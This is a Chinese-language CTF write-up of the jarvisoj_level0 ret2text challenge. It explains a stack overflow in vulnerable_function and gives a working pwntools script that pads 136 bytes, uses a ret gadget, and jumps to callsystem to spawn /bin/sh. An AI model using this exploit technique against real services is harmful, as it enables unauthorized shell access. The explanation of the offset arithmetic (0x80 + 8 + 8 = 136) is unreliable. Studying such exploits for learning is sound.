# jarvisoj_level0：ret2text 调用 `callsystem`

> 本页按仓库 ELF 的反汇编与 11.09–11.15 周记中的利用记录整理。静态信息确认这是 64 位、非 PIE 程序：`vulnerable_function` 在栈上保留 `0x80` 字节，随后对该缓冲区执行 `read(..., 0x200)`；`callsystem` 位于 `0x400596` 并调用 `system("/bin/sh")`。尚无本轮 GDB 复现记录。

## 利用链

```text
read(0, buf, 0x200) 写入 0x80 字节栈缓冲区
        ↓
覆盖 saved RBP 与 saved RIP
        ↓
ret gadget（对齐栈）→ callsystem
        ↓
system("/bin/sh")
```

仓库脚本采用 `136` 字节填充，再放 `0x400431` 和 `callsystem=0x400596`：`136 = 0x80` 局部缓冲区 + 8 字节 saved RBP + 8 字节 saved RIP 的前置距离。`0x400431` 是额外的 `ret`，常用于满足 amd64 函数调用的栈对齐要求；执行前应对照当前 ELF 确认 gadget 指令。

```python
from pwn import *

context.binary = elf = ELF('./jarvisoj_level0', checksec=False)
io = process(elf.path)
payload = flat(b'A' * 136, 0x400431, 0x400596)
io.send(payload)
io.interactive()
```

`read` 不会自动补换行，因此本地交互脚本使用 `send` 即可；如果改用 `sendline`，多出的换行会成为额外输入字节。原脚本中的远端地址是占位配置，不是可用服务地址。

## 自己核对

用 `objdump -d` 查看 `vulnerable_function` 的栈分配与 `read` 长度；再用 cyclic/GDB 找到 saved RIP 的实际覆盖偏移。确认 `0x400431` 是单条 `ret`，并检查触发 `callsystem` 后是否需要额外返回地址。周记中出现的利用过程属于学习记录，本页没有把它算成本轮独立动态验证。
